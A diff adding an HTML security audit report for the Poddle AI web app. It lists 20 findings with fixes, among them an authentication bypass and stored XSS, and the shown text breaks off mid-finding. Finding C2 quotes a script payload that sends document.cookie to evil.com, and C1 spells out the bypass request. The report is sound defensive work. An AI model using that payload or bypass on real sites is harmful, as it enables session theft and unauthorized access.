@@ -1,0 +1,1032 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Poddle AI — Security Audit Report 2026</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #f8fafc;
+      color: #1e293b;
+      line-height: 1.6;
+    }
+
+    .page {
+      max-width: 900px;
+      margin: 0 auto;
+      background: #fff;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+    }
+
+    /* ── Cover ── */
+    .cover {
+      background: linear-gradient(135deg, #0f172a 0%, #1e3a5f 60%, #1d4ed8 100%);
+      padding: 80px 60px 64px;
+      color: #fff;
+      position: relative;
+      overflow: hidden;
+    }
+    .cover::before {
+      content: '';
+      position: absolute; inset: 0;
+      background: radial-gradient(ellipse at 70% 30%, rgba(37,99,235,0.2) 0%, transparent 60%);
+    }
+    .cover-badge {
+      display: inline-flex; align-items: center; gap: 8px;
+      background: rgba(239,68,68,0.15);
+      border: 1px solid rgba(239,68,68,0.35);
+      color: #fca5a5;
+      font-size: 11px; font-weight: 700; letter-spacing: 0.08em;
+      padding: 4px 12px; border-radius: 20px; margin-bottom: 24px;
+    }
+    .cover-badge::before { content: '●'; color: #ef4444; font-size: 8px; }
+    .cover h1 {
+      font-size: 42px; font-weight: 900; letter-spacing: -0.03em;
+      line-height: 1.1; margin-bottom: 12px; position: relative;
+    }
+    .cover h1 span { color: #60a5fa; }
+    .cover .sub {
+      font-size: 16px; color: rgba(148,163,184,0.9); margin-bottom: 40px;
+      position: relative;
+    }
+    .cover-meta {
+      display: flex; gap: 40px; position: relative;
+    }
+    .cover-meta-item label {
+      display: block; font-size: 10px; font-weight: 700; letter-spacing: 0.1em;
+      color: rgba(148,163,184,0.6); text-transform: uppercase; margin-bottom: 4px;
+    }
+    .cover-meta-item span {
+      font-size: 14px; font-weight: 600; color: rgba(255,255,255,0.9);
+    }
+
+    /* ── Body content ── */
+    .body { padding: 56px 60px; }
+
+    /* ── Executive summary ── */
+    .exec-summary {
+      background: linear-gradient(135deg, #f0f9ff, #eff6ff);
+      border: 1px solid #bfdbfe;
+      border-radius: 12px;
+      padding: 28px 32px;
+      margin-bottom: 48px;
+    }
+    .exec-summary h2 {
+      font-size: 13px; font-weight: 800; letter-spacing: 0.08em; text-transform: uppercase;
+      color: #1d4ed8; margin-bottom: 12px;
+    }
+    .exec-summary p { font-size: 14px; color: #334155; line-height: 1.7; }
+
+    /* ── Score cards ── */
+    .score-grid {
+      display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px;
+      margin-bottom: 48px;
+    }
+    .score-card {
+      background: #fff; border: 1px solid #e2e8f0;
+      border-radius: 10px; padding: 20px 16px; text-align: center;
+    }
+    .score-card .num {
+      font-size: 32px; font-weight: 900; letter-spacing: -0.03em;
+      margin-bottom: 4px;
+    }
+    .score-card .lbl { font-size: 11px; font-weight: 700; letter-spacing: 0.06em; text-transform: uppercase; color: #64748b; }
+    .critical { color: #dc2626; }
+    .high { color: #d97706; }
+    .medium { color: #2563eb; }
+    .low { color: #16a34a; }
+
+    /* ── Section headers ── */
+    .section-header {
+      display: flex; align-items: center; gap: 12px;
+      margin: 48px 0 24px;
+      padding-bottom: 12px;
+      border-bottom: 2px solid #f1f5f9;
+    }
+    .section-header .icon {
+      width: 36px; height: 36px; border-radius: 8px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 16px; flex-shrink: 0;
+    }
+    .section-header h2 {
+      font-size: 20px; font-weight: 800; letter-spacing: -0.02em;
+    }
+    .section-header .count {
+      margin-left: auto;
+      font-size: 12px; font-weight: 700; letter-spacing: 0.06em; text-transform: uppercase;
+      padding: 3px 10px; border-radius: 20px;
+    }
+
+    /* ── Finding cards ── */
+    .finding {
+      border: 1px solid #e2e8f0;
+      border-radius: 10px;
+      margin-bottom: 20px;
+      overflow: hidden;
+    }
+    .finding-header {
+      display: flex; align-items: flex-start; gap: 14px;
+      padding: 18px 20px 14px;
+    }
+    .finding-num {
+      width: 28px; height: 28px; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 11px; font-weight: 900; flex-shrink: 0; color: #fff;
+    }
+    .finding-num.critical { background: #dc2626; }
+    .finding-num.high { background: #d97706; }
+    .finding-num.medium { background: #2563eb; }
+    .finding-num.low { background: #16a34a; }
+    .finding-title { font-size: 15px; font-weight: 800; color: #0f172a; margin-bottom: 3px; }
+    .finding-loc { font-size: 12px; font-family: 'SF Mono', 'Fira Code', monospace; color: #64748b; }
+    .finding-severity {
+      margin-left: auto; flex-shrink: 0;
+      font-size: 10px; font-weight: 800; letter-spacing: 0.08em; text-transform: uppercase;
+      padding: 3px 10px; border-radius: 12px;
+    }
+    .severity-critical { background: #fef2f2; color: #dc2626; border: 1px solid #fecaca; }
+    .severity-high { background: #fffbeb; color: #d97706; border: 1px solid #fed7aa; }
+    .severity-medium { background: #eff6ff; color: #2563eb; border: 1px solid #bfdbfe; }
+    .severity-low { background: #f0fdf4; color: #16a34a; border: 1px solid #bbf7d0; }
+
+    .finding-body { padding: 0 20px 18px; }
+    .finding-desc { font-size: 13.5px; color: #334155; line-height: 1.65; margin-bottom: 12px; }
+    .finding-detail { background: #f8fafc; border-radius: 8px; padding: 12px 14px; margin-bottom: 10px; }
+    .finding-detail dt {
+      font-size: 10px; font-weight: 800; letter-spacing: 0.07em; text-transform: uppercase;
+      color: #64748b; margin-bottom: 4px;
+    }
+    .finding-detail dd { font-size: 13px; color: #1e293b; }
+    .finding-fix {
+      background: #f0fdf4; border: 1px solid #bbf7d0;
+      border-radius: 8px; padding: 12px 14px;
+    }
+    .finding-fix dt {
+      font-size: 10px; font-weight: 800; letter-spacing: 0.07em; text-transform: uppercase;
+      color: #16a34a; margin-bottom: 4px;
+    }
+    .finding-fix dd { font-size: 13px; color: #166534; }
+
+    code {
+      font-family: 'SF Mono', 'Fira Code', monospace;
+      font-size: 12px; background: #f1f5f9;
+      padding: 2px 5px; border-radius: 4px; color: #be185d;
+    }
+
+    /* ── Table ── */
+    .summary-table {
+      width: 100%; border-collapse: collapse; margin-bottom: 48px;
+      font-size: 13px;
+    }
+    .summary-table th {
+      background: #f8fafc; text-align: left;
+      padding: 10px 14px;
+      font-size: 11px; font-weight: 800; letter-spacing: 0.06em; text-transform: uppercase;
+      color: #64748b; border-bottom: 2px solid #e2e8f0;
+    }
+    .summary-table td {
+      padding: 10px 14px; border-bottom: 1px solid #f1f5f9; vertical-align: top;
+    }
+    .summary-table tr:last-child td { border-bottom: none; }
+    .summary-table tr:hover td { background: #fafafa; }
+    .tag {
+      display: inline-block;
+      font-size: 10px; font-weight: 800; letter-spacing: 0.06em; text-transform: uppercase;
+      padding: 2px 8px; border-radius: 10px;
+    }
+
+    /* ── Recommendations ── */
+    .rec-list { margin-bottom: 48px; }
+    .rec-item {
+      display: flex; gap: 16px; padding: 16px 0;
+      border-bottom: 1px solid #f1f5f9;
+    }
+    .rec-item:last-child { border-bottom: none; }
+    .rec-priority {
+      width: 56px; flex-shrink: 0;
+      font-size: 10px; font-weight: 800; letter-spacing: 0.07em; text-transform: uppercase;
+      padding: 4px 0; text-align: center; border-radius: 6px;
+    }
+    .p-immediate { background: #fef2f2; color: #dc2626; }
+    .p-urgent { background: #fffbeb; color: #d97706; }
+    .p-high { background: #eff6ff; color: #2563eb; }
+    .p-medium { background: #f0fdf4; color: #16a34a; }
+    .rec-content h4 { font-size: 14px; font-weight: 700; color: #0f172a; margin-bottom: 4px; }
+    .rec-content p { font-size: 13px; color: #475569; line-height: 1.5; }
+
+    /* ── Footer ── */
+    .report-footer {
+      margin-top: 64px; padding: 32px;
+      background: #0f172a; color: rgba(148,163,184,0.8);
+      text-align: center; font-size: 12px;
+    }
+    .report-footer strong { color: #fff; }
+
+    /* ── Print ── */
+    @media print {
+      body { background: #fff; }
+      .page { box-shadow: none; max-width: 100%; }
+      .cover { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+      .finding-num { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    }
+  </style>
+</head>
+<body>
+<div class="page">
+
+  <!-- Cover -->
+  <div class="cover">
+    <div class="cover-badge">CONFIDENTIAL — INTERNAL DOCUMENT</div>
+    <h1>Poddle AI<br><span>Security Audit</span> Report</h1>
+    <p class="sub">Comprehensive vulnerability assessment across authentication, authorization,<br>
+    edge functions, RLS policies, and frontend attack surface.</p>
+    <div class="cover-meta">
+      <div class="cover-meta-item"><label>Date</label><span>29 June 2026</span></div>
+      <div class="cover-meta-item"><label>Version</label><span>1.0 — Initial Audit</span></div>
+      <div class="cover-meta-item"><label>Scope</label><span>Full-stack (Frontend + Backend + DB)</span></div>
+      <div class="cover-meta-item"><label>Classification</label><span>Internal Use Only</span></div>
+    </div>
+  </div>
+
+  <div class="body">
+
+    <!-- Executive summary -->
+    <div class="exec-summary">
+      <h2>Executive Summary</h2>
+      <p>
+        This security audit examined the Poddle AI application across three layers: the React frontend,
+        Supabase Edge Functions, and PostgreSQL RLS policies and migrations. The audit identified
+        <strong>20 distinct vulnerabilities</strong> spanning 4 severity tiers.
+        The most critical finding is an authentication bypass in the <code>workspace-synthesize</code>
+        Edge Function introduced in the recent background-synthesis feature, which allows any authenticated
+        user to trigger synthesis on workspaces they do not belong to.
+        A stored XSS vector exists via <code>dangerouslySetInnerHTML</code> in the blog rendering component.
+        The Content Security Policy allows <code>'unsafe-inline'</code> and <code>'unsafe-eval'</code>,
+        which neutralises it as a defence against injected scripts.
+        No issues were found in the link detection component — it correctly restricts to <code>https?://</code>
+        URLs only. Row-level security coverage is complete (100% of tables) and generally well-implemented.
+      </p>
+    </div>
+
+    <!-- Score cards -->
+    <div class="score-grid">
+      <div class="score-card">
+        <div class="num critical">4</div>
+        <div class="lbl">Critical</div>
+      </div>
+      <div class="score-card">
+        <div class="num high">7</div>
+        <div class="lbl">High</div>
+      </div>
+      <div class="score-card">
+        <div class="num medium">6</div>
+        <div class="lbl">Medium</div>
+      </div>
+      <div class="score-card">
+        <div class="num low">3</div>
+        <div class="lbl">Low / Info</div>
+      </div>
+    </div>
+
+    <!-- ───────────── CRITICAL ───────────── -->
+    <div class="section-header">
+      <div class="icon" style="background:#fef2f2;">🔴</div>
+      <h2>Critical Severity</h2>
+      <span class="count severity-critical">4 findings</span>
+    </div>
+
+    <!-- C-1 -->
+    <div class="finding">
+      <div class="finding-header">
+        <div class="finding-num critical">C1</div>
+        <div style="flex:1">
+          <div class="finding-title">Authentication Bypass in workspace-synthesize via from_queue Flag</div>
+          <div class="finding-loc">supabase/functions/workspace-synthesize/index.ts · lines 27–44</div>
+        </div>
+        <span class="finding-severity severity-critical">Critical</span>
+      </div>
+      <div class="finding-body">
+        <p class="finding-desc">
+          The <code>from_queue</code> parameter added to support background synthesis completely bypasses
+          membership verification when set to <code>true</code>. Because this flag is accepted from the
+          request body — which is attacker-controlled — any authenticated user can send
+          <code>{ "workspace_id": "&lt;target&gt;", "from_queue": true }</code> to trigger a
+          synthesis run on a workspace they are not a member of. The function uses the workspace owner's
+          user ID (looked up by the service role) for the synthesis run, meaning quota is consumed against
+          the owner and results are overwritten with attacker-influenced data.
+        </p>
+        <div class="finding-detail">
+          <dt>Attack Vector</dt>
+          <dd>POST /functions/v1/workspace-synthesize with any valid JWT + from_queue:true + victim workspace_id</dd>
+        </div>
+        <div class="finding-fix">
+          <dt>Recommended Fix</dt>
+          <dd>Remove <code>from_queue</code> from the request body. Instead detect internal calls by
+          checking whether the Authorization header carries the service role key:
+          <code>const isInternalCall = authHeader === `Bearer ${serviceKey}`</code>.
+          This cannot be spoofed by a client-side JWT.</dd>
+        </div>
+      </div>
+    </div>
+
+    <!-- C-2 -->
+    <div class="finding">
+      <div class="finding-header">
+        <div class="finding-num critical">C2</div>
+        <div style="flex:1">
+          <div class="finding-title">Stored XSS via dangerouslySetInnerHTML in Blog Rendering</div>
+          <div class="finding-loc">src/pages/BlogPost.tsx · line 226</div>
+        </div>
+        <span class="finding-severity severity-critical">Critical</span>
+      </div>
+      <div class="finding-body">
+        <p class="finding-desc">
+          Blog post content from the database is rendered directly via React's
+          <code>dangerouslySetInnerHTML</code> with no sanitization. An attacker with admin access
+          (or a compromised admin account) can publish a blog post containing a script payload that
+          executes in every visitor's browser. This affects all unauthenticated visitors on the guest
+          homepage as well as logged-in users.
+        </p>
+        <div class="finding-detail">
+          <dt>Affected Payload</dt>
+          <dd><code>&lt;script&gt;fetch('https://evil.com?c='+document.cookie)&lt;/script&gt;</code> in blog content field</dd>
+        </div>
+        <div class="finding-fix">
+          <dt>Recommended Fix</dt>
+          <dd>Install <code>dompurify</code> and sanitize before rendering:
+          <code>dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}</code>.
+          Alternatively, store content as Markdown and render with a safe Markdown renderer.</dd>
+        </div>
+      </div>
+    </div>
+
+    <!-- C-3 -->
+    <div class="finding">
+      <div class="finding-header">
+        <div class="finding-num critical">C3</div>
+        <div style="flex:1">
+          <div class="finding-title">Content Security Policy Allows 'unsafe-inline' and 'unsafe-eval'</div>
+          <div class="finding-loc">public/_headers · line 32</div>
+        </div>
+        <span class="finding-severity severity-critical">Critical</span>
+      </div>
+      <div class="finding-body">
+        <p class="finding-desc">
+          The CSP header for all routes permits <code>'unsafe-inline'</code> and <code>'unsafe-eval'</code>
+          in the <code>script-src</code> directive. This completely neutralises the CSP as a defence
+          against cross-site scripting attacks — any injected inline script (such as the payload in C2)
+          will execute without restriction. The header also lacks
+          <code>Strict-Transport-Security</code> (HSTS), meaning browsers are not instructed to enforce
+          HTTPS.
+        </p>
+        <div class="finding-fix">
+          <dt>Recommended Fix</dt>
+          <dd>Remove <code>'unsafe-inline'</code> and <code>'unsafe-eval'</code>. Use nonces or hashes
+          for legitimate inline scripts. Add <code>Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</code>.
+          Add <code>X-Frame-Options: DENY</code> to the root route.</dd>
+        </div>
+      </div>
+    </div>
+
+    <!-- C-4 -->
+    <div class="finding">
+      <div class="finding-header">
+        <div class="finding-num critical">C4</div>
+        <div style="flex:1">
+          <div class="finding-title">Architecture Blueprint Publicly Accessible</div>
+          <div class="finding-loc">public/poddle-architecture-blueprint-v2.doc · served at /poddle-architecture-blueprint-v2.doc</div>
+        </div>
+        <span class="finding-severity severity-critical">Critical</span>
+      </div>
+      <div class="finding-body">
+        <p class="finding-desc">
+          A detailed architecture document is checked into the <code>public/</code> directory and
+          therefore served to any visitor at a predictable URL. Combined with the Supabase project
+          ID already visible in <code>netlify.toml</code>, this gives an attacker a complete map of
+          the technical stack, data models, and integration points before any active reconnaissance.
+          A prior security audit file (<code>security-audit.docx</code>) is also served publicly.
+        </p>
+        <div class="finding-fix">
+          <dt>Recommended Fix</dt>
+          <dd>Remove <code>poddle-architecture-blueprint-v2.doc</code>, <code>security-audit.docx</code>,
+          and any other internal documents from <code>public/</code> immediately. Store these in a
+          private repository or document management system instead.</dd>
+        </div>
+      </div>
+    </div>
+
+    <!-- ───────────── HIGH ───────────── -->
+    <div class="section-header">
+      <div class="icon" style="background:#fffbeb;">🟠</div>
+      <h2>High Severity</h2>
+      <span class="count severity-high">7 findings</span>
+    </div>
+
+    <!-- H-1 -->
+    <div class="finding">
+      <div class="finding-header">
+        <div class="finding-num high">H1</div>
+        <div style="flex:1">
+          <div class="finding-title">No Role-Based Access Control on Workspace Operations</div>
+          <div class="finding-loc">supabase/functions/workspace-ai-chat/index.ts · lines 384–395</div>
+        </div>
+        <span class="finding-severity severity-high">High</span>
+      </div>
+      <div class="finding-body">
+        <p class="finding-desc">
+          The membership check on the workspace AI chat function retrieves the member's role but
+          never validates it. Any member — including those with a viewer or read-only role — can
+          send messages, trigger 3-round agent debates, and consume the daily AI message quota.
+          This violates the principle of least privilege and can be exploited to exhaust workspace
+          AI quotas.
+        </p>
+        <div class="finding-fix">
+          <dt>Recommended Fix</dt>
+          <dd>After fetching membership, validate the role: <code>if (!['owner','admin','editor'].includes(membership.role)) return 403</code></dd>
+        </div>
+      </div>
+    </div>
+
+    <!-- H-2 -->
+    <div class="finding">
+      <div class="finding-header">
+        <div class="finding-num high">H2</div>
+        <div style="flex:1">
+          <div class="finding-title">No Rate Limiting on Password Reset Endpoint</div>
+          <div class="finding-loc">src/pages/Auth.tsx · lines 70–80 · supabase/functions/send-password-reset/index.ts</div>
+        </div>
+        <span class="finding-severity severity-high">High</span>
+      </div>
+      <div class="finding-body">
+        <p class="finding-desc">
+          The password reset flow has no client-side cooldown and no server-side rate limit per IP.
+          An attacker can enumerate valid email addresses (the response differs for registered vs
+          unregistered emails), and can spam the endpoint to generate large volumes of reset emails
+          — both as user harassment and as infrastructure abuse.
+        </p>
+        <div class="finding-fix">
+          <dt>Recommended Fix</dt>
+          <dd>Add a 60-second client cooldown after each request. In the edge function, implement a
+          per-IP rate limit of 3 requests per hour using a database table or Upstash Redis.</dd>
+        </div>
+      </div>
+    </div>
+
+    <!-- H-3 -->
+    <div class="finding">
+      <div class="finding-header">
+        <div class="finding-num high">H3</div>
+        <div style="flex:1">
+          <div class="finding-title">Sensitive Tokens Stored in localStorage / sessionStorage</div>
+          <div class="finding-loc">src/App.tsx · lines 108–111, 246–262 · src/contexts/AuthContext.tsx</div>
+        </div>
+        <span class="finding-severity severity-high">High</span>
+      </div>
+      <div class="finding-body">
+        <p class="finding-desc">
+          Workspace invite tokens, referral codes, and post-login redirect targets are stored in
+          <code>localStorage</code> and <code>sessionStorage</code> in plaintext. Both stores are
+          accessible to any JavaScript executing on the page. If C2 (blog XSS) or any other XSS
+          vector is exploited, all stored tokens can be exfiltrated silently.
+        </p>
+        <div class="finding-fix">
+          <dt>Recommended Fix</dt>
+          <dd>Pass invite tokens and referral codes only via URL state (URL params or fragments, not
+          storage). For redirect targets, store only validated path strings (no full URLs). Clear
+          all stored tokens on logout.</dd>
+        </div>
+      </div>
+    </div>
+
+    <!-- H-4 -->
+    <div class="finding">
+      <div class="finding-header">
+        <div class="finding-num high">H4</div>
+        <div style="flex:1">
+          <div class="finding-title">Admin Delete User Function Has No Audit Trail</div>
+          <div class="finding-loc">supabase/migrations/20260322104814_add_delete_user_function.sql</div>
+        </div>
+        <span class="finding-severity severity-high">High</span>
+      </div>
+      <div class="finding-body">
+        <p class="finding-desc">
+          The <code>delete_user_account()</code> SECURITY DEFINER function permanently deletes a
+          user and all their data across 40+ tables with no audit record. If an admin account is
+          compromised, account deletions are undetectable. The function also lacks a transaction
+          wrapper — if any of the 40+ DELETE statements fail, the user is left in a partially deleted
+          state.
+        </p>
+        <div class="finding-fix">
+          <dt>Recommended Fix</dt>
+          <dd>Create an <code>admin_audit_log</code> table. Insert a row before executing deletions.
+          Wrap the entire function body in <code>BEGIN ... EXCEPTION WHEN OTHERS THEN ROLLBACK; RAISE;</code>.</dd>
+        </div>
+      </div>
+    </div>
+
+    <!-- H-5 -->
+    <div class="finding">
+      <div class="finding-header">
+        <div class="finding-num high">H5</div>
+        <div style="flex:1">
+          <div class="finding-title">No Audit Logging on get_admin_all_users() RPC</div>
+          <div class="finding-loc">supabase/migrations/20260626165233_create_get_admin_all_users_rpc.sql · lines 33–73</div>
+        </div>
+        <span class="finding-severity severity-high">High</span>
+      </div>
+      <div class="finding-body">
+        <p class="finding-desc">
+          The <code>get_admin_all_users()</code> function returns a directory of all users including
+          emails, names, and account metadata, with no record of who accessed it or when. A compromised
+          admin account could extract the full user directory repeatedly without detection.
+        </p>
+        <div class="finding-fix">
+          <dt>Recommended Fix</dt>
+          <dd>Log each invocation: <code>INSERT INTO admin_audit_log (admin_id, action) VALUES (auth.uid(), 'get_all_users')</code>
+          at the start of the function. Alert if the same admin calls it more than 3 times per hour.</dd>
+        </div>
+      </div>
+    </div>
+
+    <!-- H-6 -->
+    <div class="finding">
+      <div class="finding-header">
+        <div class="finding-num high">H6</div>
+        <div style="flex:1">
+          <div class="finding-title">Race Condition in onAuthStateChange — Silent Profile Creation Failures</div>
+          <div class="finding-loc">src/contexts/AuthContext.tsx · lines 61–199</div>
+        </div>
+        <span class="finding-severity severity-high">High</span>
+      </div>
+      <div class="finding-body">
+        <p class="finding-desc">
+          Multiple async database operations (profile creation, admin check, referral processing)
+          run inside a fire-and-forget async IIFE within the <code>onAuthStateChange</code> callback.
+          If profile creation fails silently, the user is marked as authenticated in the React context
+          but has no corresponding profile record — causing undefined behaviour throughout the app
+          (null profile, failed queries, broken UI). There is no timeout on any database query in
+          this path.
+        </p>
+        <div class="finding-fix">
+          <dt>Recommended Fix</dt>
+          <dd>Wrap each async block in try/catch. Add a 5-second timeout using <code>Promise.race</code>.
+          If profile creation fails, set an error state and show a recoverable error screen rather
+          than leaving the user in a broken authenticated state.</dd>
+        </div>
+      </div>
+    </div>
+
+    <!-- H-7 -->
+    <div class="finding">
+      <div class="finding-header">
+        <div class="finding-num high">H7</div>
+        <div style="flex:1">
+          <div class="finding-title">Admin Idle Timeout Uses Local Scope — Does Not Invalidate Other Sessions</div>
+          <div class="finding-loc">src/contexts/AuthContext.tsx · lines 44–50</div>
+        </div>
+        <span class="finding-severity severity-high">High</span>
+      </div>
+      <div class="finding-body">
+        <p class="finding-desc">
+          The admin inactivity logout calls <code>signOut({ scope: 'local' })</code>, which only
+          clears the local session. Other browser tabs and devices remain authenticated. An attacker
+          who steals an admin's session token (e.g. via the XSS vector in C2) retains access even
+          after the admin's primary device times out.
+        </p>
+        <div class="finding-fix">
+          <dt>Recommended Fix</dt>
+          <dd>Use <code>signOut({ scope: 'global' })</code> to invalidate all sessions.
+          Alternatively, store a <code>last_active</code> timestamp for admins in the database
+          and verify it server-side on each sensitive operation.</dd>
+        </div>
+      </div>
+    </div>
+
+    <!-- ───────────── MEDIUM ───────────── -->
+    <div class="section-header">
+      <div class="icon" style="background:#eff6ff;">🔵</div>
+      <h2>Medium Severity</h2>
+      <span class="count severity-medium">6 findings</span>
+    </div>
+
+    <!-- M-1 -->
+    <div class="finding">
+      <div class="finding-header">
+        <div class="finding-num medium">M1</div>
+        <div style="flex:1">
+          <div class="finding-title">Anonymous Contact Form and Inbox Submissions Have No Length Constraints</div>
+          <div class="finding-loc">supabase/migrations/20260408102742 · 20260618143553</div>
+        </div>
+        <span class="finding-severity severity-medium">Medium</span>
+      </div>
+      <div class="finding-body">
+        <p class="finding-desc">
+          Both the contact form and decision inbox accept anonymous submissions with
+          <code>WITH CHECK (true)</code> and no column-level length constraints. This
+          enables spam attacks, storage exhaustion, and large-payload injection at zero cost.
+        </p>
+        <div class="finding-fix">
+          <dt>Recommended Fix</dt>
+          <dd>Add CHECK constraints on string columns: <code>char_length(message) BETWEEN 10 AND 10000</code>.
+          Add a per-IP rate limit of 3 submissions per hour using <code>pg_net</code> or an edge function.</dd>
+        </div>
+      </div>
+    </div>
+
+    <!-- M-2 -->
+    <div class="finding">
+      <div class="finding-header">
+        <div class="finding-num medium">M2</div>
+        <div style="flex:1">
+          <div class="finding-title">CORS Wildcard Origin on All Edge Functions</div>
+          <div class="finding-loc">All 24 supabase/functions/*/index.ts — Access-Control-Allow-Origin: *</div>
+        </div>
+        <span class="finding-severity severity-medium">Medium</span>
+      </div>
+      <div class="finding-body">
+        <p class="finding-desc">
+          Every Edge Function sets <code>Access-Control-Allow-Origin: *</code>. While Supabase JWT
+          authentication prevents unauthenticated cross-origin requests from succeeding, the wildcard
+          header is unnecessary and removes a defence-in-depth layer. Combined with XSS in C2,
+          a malicious page could call authenticated Edge Functions on behalf of the logged-in user.
+        </p>
+        <div class="finding-fix">
+          <dt>Recommended Fix</dt>
+          <dd>Restrict to production origin: <code>Access-Control-Allow-Origin: https://poddle.me</code>.
+          Use an environment variable so staging environments can be accommodated.</dd>
+        </div>
+      </div>
+    </div>
+
+    <!-- M-3 -->
+    <div class="finding">
+      <div class="finding-header">
+        <div class="finding-num medium">M3</div>
+        <div style="flex:1">
+          <div class="finding-title">Referral Code Enumeration via Client-Side Validation</div>
+          <div class="finding-loc">src/contexts/AuthContext.tsx · lines 149–177</div>
+        </div>
+        <span class="finding-severity severity-medium">Medium</span>
+      </div>
+      <div class="finding-body">
+        <p class="finding-desc">
+          Referral codes are stored in <code>localStorage</code> and validated client-side against
+          the <code>referral_codes</code> table during sign-up with no rate limit. An attacker can
+          automate requests to enumerate valid codes and identify active users' referral links.
+        </p>
+        <div class="finding-fix">
+          <dt>Recommended Fix</dt>
+          <dd>Remove referral codes from localStorage. Pass them only via URL parameters cleared
+          after first use. Add server-side rate limiting (5 lookups per IP per hour).</dd>
+        </div>
+      </div>
+    </div>
+
+    <!-- M-4 -->
+    <div class="finding">
+      <div class="finding-header">
+        <div class="finding-num medium">M4</div>
+        <div style="flex:1">
+          <div class="finding-title">View Count Functions Exploitable for Metrics Inflation</div>
+          <div class="finding-loc">supabase/migrations/20260410222916_add_viral_sharing_counts.sql · lines 91–174</div>
+        </div>
+        <span class="finding-severity severity-medium">Medium</span>
+      </div>
+      <div class="finding-body">
+        <p class="finding-desc">
+          The <code>increment_*_view()</code> and <code>increment_*_share()</code> functions are
+          callable by anonymous users with session-based deduplication. Because session IDs are
+          attacker-controlled, an adversary can inflate view and share counts on any content by
+          cycling unique session identifiers.
+        </p>
+        <div class="finding-fix">
+          <dt>Recommended Fix</dt>
+          <dd>Add IP-address-based bucketing using <code>inet_client_addr()</code> and a short-window
+          rate check: max 10 increments per IP per hour per content item.</dd>
+        </div>
+      </div>
+    </div>
+
+    <!-- M-5 -->
+    <div class="finding">
+      <div class="finding-header">
+        <div class="finding-num medium">M5</div>
+        <div style="flex:1">
+          <div class="finding-title">PDF Export Has No Workspace Membership Check</div>
+          <div class="finding-loc">src/lib/pdfExport.ts — all export functions</div>
+        </div>
+        <span class="finding-severity severity-medium">Medium</span>
+      </div>
+      <div class="finding-body">
+        <p class="finding-desc">
+          The PDF export functions receive synthesis and chat data from the caller without independently
+          verifying workspace membership. If a caller passes workspace data obtained via another
+          vulnerability, the export functions will silently produce a PDF containing that data with
+          no access check of their own.
+        </p>
+        <div class="finding-fix">
+          <dt>Recommended Fix</dt>
+          <dd>Log each export to a <code>workspace_pdf_exports</code> table with user ID and
+          timestamp. Validate workspace membership inside the export function before processing.</dd>
+        </div>
+      </div>
+    </div>
+
+    <!-- M-6 -->
+    <div class="finding">
+      <div class="finding-header">
+        <div class="finding-num medium">M6</div>
+        <div style="flex:1">
+          <div class="finding-title">AI Chat Rate Limit Too High — API Cost Exposure</div>
+          <div class="finding-loc">supabase/functions/ask-agents/index.ts · line 34</div>
+        </div>
+        <span class="finding-severity severity-medium">Medium</span>
+      </div>
+      <div class="finding-body">
+        <p class="finding-desc">
+          Authenticated users are permitted 30 requests per hour to the <code>ask-agents</code>
+          endpoint. Each request triggers multiple GPT-4 completions costing approximately $0.02–0.10.
+          At the upper bound, a single user can generate $3/hour in API costs without triggering
+          any limit. Across multiple accounts this becomes a significant financial exposure.
+        </p>
+        <div class="finding-fix">
+          <dt>Recommended Fix</dt>
+          <dd>Lower the authenticated hourly limit to 10. Add a daily cap of 50. Implement cost-based
+          alerting that triggers when a user's estimated daily spend exceeds $1.</dd>
+        </div>
+      </div>
+    </div>
+
+    <!-- ───────────── LOW ───────────── -->
+    <div class="section-header">
+      <div class="icon" style="background:#f0fdf4;">🟢</div>
+      <h2>Low / Informational</h2>
+      <span class="count severity-low">3 findings</span>
+    </div>
+
+    <!-- L-1 -->
+    <div class="finding">
+      <div class="finding-header">
+        <div class="finding-num low">L1</div>
+        <div style="flex:1">
+          <div class="finding-title">robots.txt Discloses Private Route Structure</div>
+          <div class="finding-loc">public/robots.txt · lines 14–24</div>
+        </div>
+        <span class="finding-severity severity-low">Low</span>
+      </div>
+      <div class="finding-body">
+        <p class="finding-desc">
+          The robots.txt file explicitly disallows <code>/workspace/</code> and <code>/#workspace/</code>,
+          revealing the existence and naming of private routes to search engine crawlers and attackers.
+          The Supabase project ID is also visible in <code>netlify.toml</code> and the sitemap endpoint.
+        </p>
+        <div class="finding-fix">
+          <dt>Recommended Fix</dt>
+          <dd>Remove specific private route paths from robots.txt. Use a generic
+          <code>Disallow: /</code> for sensitive areas or rely solely on authentication.
+          Remove or proxy the generate-sitemap URL so the Supabase project ID is not exposed.</dd>
+        </div>
+      </div>
+    </div>
+
+    <!-- L-2 -->
+    <div class="finding">
+      <div class="finding-header">
+        <div class="finding-num low">L2</div>
+        <div style="flex:1">
+          <div class="finding-title">Verbose Error Messages in Edge Functions</div>
+          <div class="finding-loc">Multiple edge functions — error detail field in JSON responses</div>
+        </div>
+        <span class="finding-severity severity-low">Low</span>
+      </div>
+      <div class="finding-body">
+        <p class="finding-desc">
+          Several Edge Functions return internal error details in the <code>detail</code> field of
+          error responses (e.g. <code>{ error: "...", detail: deleteError.message }</code>).
+          These messages can reveal internal table names, column names, and constraint names.
+        </p>
+        <div class="finding-fix">
+          <dt>Recommended Fix</dt>
+          <dd>Return only generic messages to clients. Log full error details server-side via
+          <code>console.error</code> (visible in Supabase function logs) only.</dd>
+        </div>
+      </div>
+    </div>
+
+    <!-- L-3 -->
+    <div class="finding">
+      <div class="finding-header">
+        <div class="finding-num low">L3</div>
+        <div style="flex:1">
+          <div class="finding-title">No Centralised Audit Logging for Privileged Operations</div>
+          <div class="finding-loc">Multiple admin functions and RPCs</div>
+        </div>
+        <span class="finding-severity severity-low">Low</span>
+      </div>
+      <div class="finding-body">
+        <p class="finding-desc">
+          Admin operations (delete user, ban user, reject verification, get all users) produce
+          no audit trail. This makes post-incident investigation impossible and means compliance
